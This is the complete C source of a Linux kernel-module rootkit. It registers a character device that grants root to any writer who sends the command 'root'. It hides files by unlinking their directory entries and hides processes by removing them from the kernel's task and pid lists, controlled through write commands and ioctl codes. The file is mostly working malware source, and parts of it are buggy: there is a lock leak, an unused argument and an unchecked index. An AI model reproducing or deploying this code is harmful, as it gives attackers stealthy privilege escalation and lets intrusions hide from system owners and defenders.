#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/export.h>
#include <linux/slab.h>
#include "rootkit.h"

static struct task_struct * hide_task[0x10] = {0};

static void hideFile(const char * filename);
static void hideProc(const char * procname);

static int a3_rootkit_open(struct inode * __inode, struct file * __file)
{
    return 0;
}

static ssize_t a3_rootkit_read(struct file * __file, char __user * user_buf, size_t size, loff_t * __loff)
{
    return 0;
}

static ssize_t a3_rootkit_write(struct file * __file, const char __user * user_buf, size_t size, loff_t * __loff)
{
    //commit_creds(prepare_kernel_cred(NULL));
    struct task_struct * task = current;
	struct cred * old = task->real_cred;
	
	char *param, *filename, *procname;
    int temp;

    param = kmalloc(size + 1, GFP_KERNEL);
    copy_from_user(param, user_buf, size);
    param[size] = '\0';
    if (param[size - 1] == '\n')    // like echo 'cmd param' > /dev/rootkitdev, a '\n' will be appended at the end
        param[size - 1] = '\0';

    if (!strncmp(param, "root", 4))
    {
        old->gid = old->sgid = old->egid = KGIDT_INIT(0);
        old->uid = old->suid = old->euid = KUIDT_INIT(0);
    }

    if (!strncmp(param, "hidef", 5))
    {
        filename = (char *)(((long long)param) + 5);
        for (temp = 0; filename[temp++] == ' '; )
            filename = &(filename[temp]);
        
        hideFile(filename);
    }
    
    if (!strncmp(param, "hidep", 5))
    {
        procname = (char *)(((long long)param) + 5);
        for (temp = 0; procname[temp++] == ' '; )
            procname = &(procname[temp]);
        
        hideProc(procname);
    }

    kfree(param);

    return size;
}

static int a3_rootkit_release(struct inode * __inode, struct file * __file)
{
    //printk(KERN_INFO "get info");
    return 0;
}

static long a3_rootkit_ioctl(struct file * __file, unsigned int cmd, unsigned long param)
{
    struct task_struct * task;
    struct hlist_node *cur_node;
    int temp;

    spin_lock(&current->sighand->siglock);

    cur_node = &current->pid_links[PIDTYPE_PID];

    switch (cmd)
    {
        case 0x1001:    // hide process
            for (temp = 0;hide_task[temp];temp++)
                ;
            if (temp == 0x10)  //full
                break;
            hide_task[temp] = current;

            // remove from task_struct lists
            list_del_rcu(&current->tasks);
            INIT_LIST_HEAD(&current->tasks);

            // remove from pid lists
            hlist_del_rcu(cur_node);
            INIT_HLIST_NODE(cur_node);
            cur_node->pprev = &cur_node;

            break;
        case 0x1002:    // restore process
            task = hide_task[param];
            list_add_tail_rcu(&task->tasks, &init_task.tasks);
            hlist_add_head_rcu(&task->pid_links[PIDTYPE_PID], &task->thread_pid->tasks[PIDTYPE_PID]);
            hide_task[param] = NULL;
            break;
        
        default:
            break;
    }

    spin_unlock(&current->sighand->siglock);
    return 0;
}
static void hideFile(const char * filename)
{
    struct file * hide_file = NULL;
    struct dentry * hide_dentry;

    hide_file = filp_open(filename, O_RDONLY, 0);
    
    if (!IS_ERR(hide_file))
    {
        hide_dentry = hide_file->f_path.dentry;

        hide_dentry->d_child.next->prev = hide_dentry->d_child.prev;
        hide_dentry->d_child.prev->next = hide_dentry->d_child.next;

        filp_close(hide_file, NULL);
    	printk(KERN_INFO "%s hiden.", filename);
    }
}

static void hideProc(const char * procname)
{
    struct task_struct * task;
    struct hlist_node *cur_node;
    int temp;

    spin_lock(&current->sighand->siglock);

    cur_node = &current->pid_links[PIDTYPE_PID];
    
    for (temp = 0;hide_task[temp];temp++)
        ;
    if (temp == 0x10)  //full
        return;
    hide_task[temp] = current;

    // remove from task_struct lists
    list_del_rcu(&current->tasks);
    INIT_LIST_HEAD(&current->tasks);

    // remove from pid lists
    hlist_del_rcu(cur_node);
    INIT_HLIST_NODE(cur_node);
    cur_node->pprev = &cur_node;
    
    spin_unlock(&current->sighand->siglock);
}
